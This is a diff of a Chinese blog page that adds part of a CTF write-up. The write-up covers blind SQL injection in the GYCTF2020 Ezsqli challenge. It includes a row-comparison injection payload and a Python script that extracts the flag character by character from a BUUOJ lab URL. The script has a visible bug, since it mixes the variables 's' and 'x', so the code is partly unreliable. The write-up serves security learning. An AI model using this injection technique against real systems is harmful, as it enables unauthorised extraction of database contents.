+<p>网上的大佬用1&amp;&amp;((1,1)&gt;(select * from f1ag_1s_h3r3_hhhhh))，说明有两列，继续测试，给右边的1加个引号，发现报错了。把右边的1换成 **’f’**，继续报错，换成 **’g’**，返回正确结果，这时基本上可以判定flag在这个表的第二列了。</p>
+<figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&#x27;http://6c05130d-3668-41d6-9ad6-5e69ce00e0cc.node3.buuoj.cn/index.php&#x27;</span></span><br><span class="line">s=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">33</span>,<span class="number">127</span>):</span><br><span class="line">        flag=s+chr(i)</span><br><span class="line">        payload = <span class="string">&quot;1&amp;&amp;((1,&#x27;&#123;&#125;&#x27;)&gt;(select * from f1ag_1s_h3r3_hhhhh))&quot;</span>.format(flag)</span><br><span class="line">        <span class="keyword">data</span>=&#123;</span><br><span class="line">        <span class="string">&#x27;id&#x27;</span>:payload</span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.post(url,<span class="keyword">data</span>=<span class="keyword">data</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Nu1L&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            x=x+chr(i-<span class="number">1</span>)</span><br><span class="line">            print(x)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>可以求出flag,但调试经常出问题，还有大小写问题，要再学学，多打打脚本。</p>
 
                 
             </div>
@@ -543,7 +587,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://example.com/2021/11/15/loveSQL%E5%92%8C-GYCTF2020-Ezsqli-wp/">http://example.com/2021/11/15/loveSQL%E5%92%8C-GYCTF2020-Ezsqli-wp/</a>
+                    <a href="http://example.com/2021/11/20/python%E7%9B%B2%E6%B3%A8%E8%84%9A%E6%9C%AC/">http://example.com/2021/11/20/python%E7%9B%B2%E6%B3%A8%E8%84%9A%E6%9C%AC/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -581,8 +625,8 @@
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/sqli%E9%9D%B6%E5%9C%BA/">
-                                    <span class="chip bg-color">sqli靶场</span>
+                                <a href="/tags/web%E9%A2%98%E7%9B%AE/">
+                                    <span class="chip bg-color">web题目</span>
                                 </a>
                             
                         </div>
@@ -754,17 +798,18 @@
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;Previous</div>
+                <i class="far fa-dot-circle"></i>&nbsp;Current
+            </div>
             <div class="card">
-                <a href="/2021/11/17/loveSQL%E5%92%8C-GYCTF2020-Ezsqli-wp2/">
+                <a href="/2021/11/20/python%E7%9B%B2%E6%B3%A8%E8%84%9A%E6%9C%AC/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/10.jpg" class="responsive-img" alt="loveSQL和[GYCTF2020]Ezsqli wp2">
+                        <img src="/medias/featureimages/12.jpg" class="responsive-img" alt="python盲注脚本">
                         
-                        <span class="card-title">loveSQL和[GYCTF2020]Ezsqli wp2</span>
+                        <span class="card-title">python盲注脚本</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -774,9 +819,9 @@
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2021-11-17
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-11-20
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-user fa-fw"></i>
@@ -784,6 +829,15 @@
                             
                         </span>
                     </div>
+                </div>
+
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/web%E9%A2%98%E7%9B%AE/">
+                        <span class="chip bg-color">web题目</span>
+                    </a>
+                    
                 </div>
                 
             </div>
@@ -795,13 +849,13 @@
                 Next&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2021/11/14/MYSQL%E6%95%B0%E6%8D%AE%E5%BA%93%E6%9F%A5%E8%AF%A2%E8%AF%AD%E5%8F%A5/">
+                <a href="/2021/11/18/lesson1-10/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/0.jpg" class="responsive-img" alt="MYSQL数据库查询语句">
+                        <img src="/medias/featureimages/18.jpg" class="responsive-img" alt="sqli1-10">
                         
-                        <span class="card-title">MYSQL数据库查询语句</span>
+                        <span class="card-title">sqli1-10</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -812,7 +866,7 @@
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2021-11-14
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-11-18
                             </span>
                         <span class="publish-author">
                             
